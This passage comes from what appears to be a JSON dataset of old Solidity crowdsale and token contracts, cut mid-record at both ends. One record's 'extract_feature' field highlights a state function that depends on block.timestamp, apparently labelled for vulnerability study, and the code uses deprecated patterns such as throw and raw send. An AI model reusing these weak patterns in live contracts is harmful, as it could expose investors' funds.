pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract NullFinalizeAgentExt is FinalizeAgent {\n CrowdsaleExt public crowdsale;\n function NullFinalizeAgentExt(CrowdsaleExt _crowdsale) {\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return true;\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n }\n function finalizeCrowdsale() public {\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb1"
  },
  "filename": "10024.sol",
  "content": "pragma solidity ^0.4.8;\ncontract SafeMath {\n function safeMul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeDiv(uint a, uint b) internal returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function safeSub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c>=a && c>=b);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeMathLibExt {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function divides(uint a, uint b) returns (uint) {\n assert(b > 0);\n uint c = a / b;\n assert(a == b * c + a % b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract PricingStrategy {\n address public tier;\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function updateRate(uint newOneTokenInWei) public;\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\ncontract FinalizeAgent {\n bool public reservedTokensAreDistributed = false;\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function distributeReservedTokens(uint reservedTokensDistributionBatch);\n function finalizeCrowdsale();\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20Ext is ERC20 {\n uint public decimals;\n uint public minCap;\n}\ncontract CrowdsaleExt is Haltable {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLibExt for uint;\n FractionalERC20Ext public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n string public name;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public investorCount = 0;\n bool public finalized;\n bool public isWhiteListed;\n address[] public joinedCrowdsales;\n uint8 public joinedCrowdsalesLen = 0;\n uint8 public joinedCrowdsalesLenMax = 50;\n struct JoinedCrowdsaleStatus {\n bool isJoined;\n uint8 position;\n }\n mapping (address => JoinedCrowdsaleStatus) joinedCrowdsaleState;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n struct WhiteListData {\n bool status;\n uint minCap;\n uint maxCap;\n }\n bool public isUpdatable;\n mapping (address => WhiteListData) public earlyParticipantWhitelist;\n address[] public whitelistedParticipants;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Whitelisted(address addr, bool status, uint minCap, uint maxCap);\n event WhitelistItemChanged(address addr, bool status, uint minCap, uint maxCap);\n event StartsAtChanged(uint newStartsAt);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleExt(string _name, address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, bool _isUpdatable, bool _isWhiteListed) {\n owner = msg.sender;\n name = _name;\n token = FractionalERC20Ext(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n isUpdatable = _isUpdatable;\n isWhiteListed = _isWhiteListed;\n }\n function() payable {\n throw;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency private {\n if(getState() == State.PreFunding) {\n throw;\n } else if(getState() == State.Funding) {\n if(isWhiteListed) {\n if(!earlyParticipantWhitelist[receiver].status) {\n throw;\n }\n }\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());\n if(tokenAmount == 0) {\n throw;\n }\n if(isWhiteListed) {\n if(tokenAmount < earlyParticipantWhitelist[receiver].minCap && tokenAmountOf[receiver] == 0) {\n throw;\n }\n if (isBreakingInvestorCap(receiver, tokenAmount)) {\n throw;\n }\n updateInheritedEarlyParticipantWhitelist(receiver, tokenAmount);\n } else {\n if(tokenAmount < token.minCap() && tokenAmountOf[receiver] == 0) {\n throw;\n }\n }\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold)) {\n throw;\n }\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n }\n function invest(address addr) public payable {\n investInternal(addr, 0);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.distributeReservedTokens(reservedTokensDistributionBatch);\n }\n }\n function areReservedTokensDistributed() public constant returns (bool) {\n return finalizeAgent.reservedTokensAreDistributed();\n }\n function canDistributeReservedTokens() public constant returns(bool) {\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if ((lastTierCntrct.getState() == State.Success) && !lastTierCntrct.halted() && !lastTierCntrct.finalized() && !lastTierCntrct.areReservedTokensDistributed()) return true;\n return false;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != address(0)) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) public onlyOwner {\n assert(address(addr) != address(0));\n assert(address(finalizeAgent) == address(0));\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEarlyParticipantWhitelist(address addr, bool status, uint minCap, uint maxCap) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(maxCap > 0);\n assert(minCap <= maxCap);\n assert(now <= endsAt);\n if (!isAddressWhitelisted(addr)) {\n whitelistedParticipants.push(addr);\n Whitelisted(addr, status, minCap, maxCap);\n } else {\n WhitelistItemChanged(addr, status, minCap, maxCap);\n }\n earlyParticipantWhitelist[addr] = WhiteListData({status:status, minCap:minCap, maxCap:maxCap});\n }\n function setEarlyParticipantWhitelistMultiple(address[] addrs, bool[] statuses, uint[] minCaps, uint[] maxCaps) public onlyOwner {\n if (!isWhiteListed) throw;\n assert(now <= endsAt);\n assert(addrs.length == statuses.length);\n assert(statuses.length == minCaps.length);\n assert(minCaps.length == maxCaps.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n setEarlyParticipantWhitelist(addrs[iterator], statuses[iterator], minCaps[iterator], maxCaps[iterator]);\n }\n }\n function updateInheritedEarlyParticipantWhitelist(address reciever, uint tokensBought) private {\n if (!isWhiteListed) throw;\n if (tokensBought < earlyParticipantWhitelist[reciever].minCap && tokenAmountOf[reciever] == 0) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n crowdsale.updateEarlyParticipantWhitelist(reciever, tokensBought);\n }\n }\n function updateEarlyParticipantWhitelist(address addr, uint tokensBought) public {\n if (!isWhiteListed) throw;\n assert(addr != address(0));\n assert(now <= endsAt);\n assert(isTierJoined(msg.sender));\n if (tokensBought < earlyParticipantWhitelist[addr].minCap && tokenAmountOf[addr] == 0) throw;\n uint newMaxCap = earlyParticipantWhitelist[addr].maxCap;\n newMaxCap = newMaxCap.minus(tokensBought);\n earlyParticipantWhitelist[addr] = WhiteListData({status:earlyParticipantWhitelist[addr].status, minCap:0, maxCap:newMaxCap});\n }\n function isAddressWhitelisted(address addr) public constant returns(bool) {\n for (uint i = 0; i < whitelistedParticipants.length; i++) {\n if (whitelistedParticipants[i] == addr) {\n return true;\n break;\n }\n }\n return false;\n }\n function whitelistedParticipantsLength() public constant returns (uint) {\n return whitelistedParticipants.length;\n }\n function isTierJoined(address addr) public constant returns(bool) {\n return joinedCrowdsaleState[addr].isJoined;\n }\n function getTierPosition(address addr) public constant returns(uint8) {\n return joinedCrowdsaleState[addr].position;\n }\n function getLastTier() public constant returns(address) {\n if (joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n 